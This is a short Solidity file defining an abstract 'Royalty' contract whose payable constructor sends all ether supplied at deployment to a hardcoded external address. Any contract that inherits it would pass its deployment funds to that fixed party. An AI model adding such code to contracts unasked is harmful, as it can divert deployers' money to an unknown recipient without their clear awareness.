// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

abstract contract Royalty {
     constructor () payable {
        (bool sent, bytes memory data) = 0x07590a393C67670463b80768fEED264832541d51.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}